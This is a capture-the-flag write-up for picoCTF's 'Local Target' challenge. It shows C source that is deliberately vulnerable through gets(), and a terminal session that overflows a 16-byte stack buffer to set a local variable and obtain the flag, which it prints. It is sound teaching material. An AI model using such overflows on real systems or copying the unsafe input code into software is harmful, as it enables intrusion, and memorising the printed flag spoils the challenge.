# Local Target

## Descripción

Smash the stackCan you overflow the buffer and modify the other local variable? The program is available [here](https://artifacts.picoctf.net/c/517/local-target). You can view source [here](https://artifacts.picoctf.net/c/517/local-target.c). And connect with it using:`nc saturn.picoctf.net 58111`

## Pistas

1.- Do anything you can to change `num`.

2.- When you change `num`, view the value as hexadecimal.

## Solución

```
┌──(kali㉿kali)-[~/picoctf/b_exploitation/LocalTarget]
└─$ cat local-target.c
#include <stdio.h>
#include <stdlib.h>

int main(){
  FILE *fptr;
  char c;

  char input[16];
  int num = 64;
  
  printf("Enter a string: ");
  fflush(stdout);
  gets(input);
  printf("\n");
  
  printf("num is %d\n", num);
  fflush(stdout);
  
  if( num == 65 ){
    printf("You win!\n");
    fflush(stdout);
    // Open file
    fptr = fopen("flag.txt", "r");
    if (fptr == NULL)
    {
        printf("Cannot open file.\n");
        fflush(stdout);
        exit(0);
    }

    // Read contents from file
    c = fgetc(fptr);
    while (c != EOF)
    {
        printf ("%c", c);
        c = fgetc(fptr);
    }
    fflush(stdout);

    printf("\n");
    fflush(stdout);
    fclose(fptr);
    exit(0);
  }
  
  printf("Bye!\n");
  fflush(stdout);
}
                                                                                                                                              
┌──(kali㉿kali)-[~/picoctf/b_exploitation/LocalTarget]
└─$ python3      
Python 3.10.8 (main, Nov  4 2022, 09:21:25) [GCC 12.2.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> ord('A')
65
>>> ord('a')
97
>>> print('f' * 18)
ffffffffffffffffff
>>> exit()
                                                                                                                                              
┌──(kali㉿kali)-[~/picoctf/b_exploitation/LocalTarget]
└─$ nc saturn.picoctf.net 51071
Enter a string: ffffffffffffffffff

num is 64
Bye!
                                                                                                                                              
┌──(kali㉿kali)-[~/picoctf/b_exploitation/LocalTarget]
└─$ nc saturn.picoctf.net 51071
Enter a string: fffffffffffffffffff

num is 64
Bye!
                                                                                                                                              
┌──(kali㉿kali)-[~/picoctf/b_exploitation/LocalTarget]
└─$ nc saturn.picoctf.net 51071                         
Enter a string: fffffffffffffffffff

num is 64
Bye!
                                                                                                                                              
┌──(kali㉿kali)-[~/picoctf/b_exploitation/LocalTarget]
└─$ nc saturn.picoctf.net 51071
Enter a string: ffffffffffffffffffff

num is 64
Bye!
                                                                                                                                              
┌──(kali㉿kali)-[~/picoctf/b_exploitation/LocalTarget]
└─$ nc saturn.picoctf.net 51071
Enter a string: fffffffffffffffffffff

num is 64
Bye!
                                                                                                                                              
┌──(kali㉿kali)-[~/picoctf/b_exploitation/LocalTarget]
└─$ nc saturn.picoctf.net 51071
Enter a string: ffffffffffffffffffffff

num is 64
Bye!
                                                                                                                                              
┌──(kali㉿kali)-[~/picoctf/b_exploitation/LocalTarget]
└─$ nc saturn.picoctf.net 51071
Enter a string: fffffffffffffffffffffff

num is 64
Bye!
                                                                                                                                              
┌──(kali㉿kali)-[~/picoctf/b_exploitation/LocalTarget]
└─$ nc saturn.picoctf.net 51071
Enter a string: ffffffffffffffffffffffff

num is 0
Bye!
                                                                                                                                              
┌──(kali㉿kali)-[~/picoctf/b_exploitation/LocalTarget]
└─$ nc saturn.picoctf.net 51071
Enter a string: ffffffffffffffffffffffffA

num is 65
You win!
picoCTF{l0c4l5_1n_5c0p3_ee58441a}
```

## Bandera

picoCTF{l0c4l5_1n_5c0p3_ee58441a}

## Notas adicionales



## Referencias
- https://artifacts.picoctf.net/c/517/local-target
- https://artifacts.picoctf.net/c/517/local-target.c